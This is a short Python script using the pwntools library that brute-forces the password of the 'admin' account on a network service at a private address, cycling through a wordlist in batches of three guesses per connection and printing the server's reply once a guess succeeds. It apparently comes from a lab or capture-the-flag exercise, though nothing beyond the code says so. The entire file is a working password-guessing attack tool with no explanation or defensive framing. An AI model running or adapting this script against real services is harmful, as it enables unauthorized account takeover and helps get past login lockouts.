from pwn import *

host = "10.66.175.252"
port = 8000

#context.log_level = "debug"

passwords = open("words.list").read().splitlines()

for batch in [passwords[i:i+3] for i in range(0, len(passwords), 3)]:
    r = remote(host, port)

    r.sendline(b"admin")

    for pwd in [p.encode() for p in batch]:
        
        if r.recvuntil(b"Password:", timeout=2):
            print("Trying", pwd)
            r.sendline(pwd)
            continue
        data = r.recvall(timeout=1)
        print("success", data)
        exit()

    r.close()
